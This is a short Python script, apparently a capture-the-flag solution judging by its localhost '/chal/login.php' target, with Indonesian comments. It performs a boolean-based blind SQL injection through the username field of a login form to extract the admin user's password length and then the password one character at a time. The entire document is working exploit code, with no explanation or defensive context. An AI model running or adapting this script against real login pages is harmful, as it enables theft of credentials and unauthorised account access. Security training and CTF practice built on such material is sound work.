import requests

url = 'http://localhost:8080/chal/login.php'

def generate_payload(payload):
    username = "' and 0 union select 1, 1, (%s) -- -" % payload
    return username

char = 'abcdefghijklmnopqrstuvwxyz_0123456789'

# Dapetin panjang password
c = 1
while True:
    payload = "select if((select char_length(password) from users where username = 'admin') = %d, 1, 0)" % c
    payload = generate_payload(payload)
    data = {
        'username' : payload,
        'password' : 1
    }
    r = requests.post(url, data=data)
    if 'berhasil' in r.text:
        print c
        break
    c += 1

# Dapetin password
res = ""
for i in range(1, c+1):
    for j in char:
        payload = "select if(substring((select password from users where username = 'admin'), %d, 1) = '%s', 1, 0)" % (i, j)
        payload = generate_payload(payload)
        data = {
            'username' : payload,
            'password' : 1
        }
        r = requests.post(url, data=data)
        if 'berhasil' in r.text:
            res += j
            print res
            break